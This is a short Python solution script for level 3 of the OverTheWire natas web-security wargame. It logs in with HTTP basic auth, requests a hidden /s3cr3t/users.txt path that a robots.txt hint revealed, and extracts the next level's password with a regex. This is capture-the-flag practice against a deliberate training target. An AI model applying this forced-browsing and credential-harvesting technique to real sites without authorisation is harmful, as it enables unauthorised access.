import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '3'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas3', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    #There is a "users.txt" under /s3cr3t/ that contains the natas4 pass, found using the "robots.txt" file hint
    r = requests.get('http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt', auth=auth)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[0])

if __name__ == "__main__":
    get_pass()
